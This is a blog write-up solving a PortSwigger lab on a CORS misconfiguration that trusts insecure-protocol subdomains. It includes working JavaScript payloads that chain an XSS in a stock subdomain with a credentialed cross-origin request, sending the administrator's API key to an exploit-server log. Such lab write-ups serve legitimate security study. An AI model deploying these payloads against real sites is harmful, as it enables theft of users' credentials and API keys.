---
author: Nithissh S
pubDatetime: 2024-10-16T15:22:00Z
modDatetime: 2024-10-16T09:12:47.400Z
title: CORS vulnerability with trusted insecure protocols
slug: cors-portswigger-lab-2
featured: false
draft: false
tags:
  - BSCP
  - CORS
description:
  This website has an insecure CORS configuration in that it trusts all subdomains regardless of the protocol. To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key. You can log in to your own account using the following credentials wiener:peter    
---

## Introduction

This website has an insecure CORS configuration in that it trusts all subdomains regardless of the protocol.

To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key.

You can log in to your own account using the following credentials: wiener:peter 

## Solution

Looks like the same previous lab, but there is a new functionality to check the stocks where it takes new subdomain called `stock` and there is a XSS vulnerability through `productId`

![](../../assets/images/bscp/cors/cors-14.png)


As same the previous lab, we found a endpoint called `/accountDetails` where it shows the API keys being available of the loggedin user

![](../../assets/images/bscp/cors/cors-15.png)

Now coming to the CORS part, In the `/accountDetails` endpoint we sent the `Origin: http://example.com` and nothing happens in the response 

![](../../assets/images/bscp/cors/cors-16.png)

But when we send the subdomain as a origin, it accepts and discloses in the response as an `ACAO` 

![](../../assets/images/bscp/cors/cors-17.png)

When we look back at our first lab, we can take that POC and make it as a oneliner 

```js
<script>var req=new XMLHttpRequest();req.onload=reqListener;req.open('get','https://0a90007603b4470f808430ae0091001b.web-security-academy.net/accountDetails',true);req.withCredentials=true;req.send();function reqListener(){location='/log?key='+this.responseText;}</script>
```

And submitted it as payload for the XSS in the `stock` subdomain and it works as you see

![](../../assets/images/bscp/cors/cors-18.png)


Ok awesome, In the Exploit server with the following POC 

```html
<script>
    document.location="http://stock.0a18006104de0fa18139b1cb001d000c.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a18006104de0fa18139b1cb001d000c.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0ab8008604440fdf8185b06c01ad008c.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```

Once after delivering the exploit to the victim and checking the accesslog we found the `administrator` API key

![](../../assets/images/bscp/cors/cors-20.png)

Take the API key and submit it as a solution and the lab will be solved 

![](../../assets/images/bscp/cors/cors-21.png)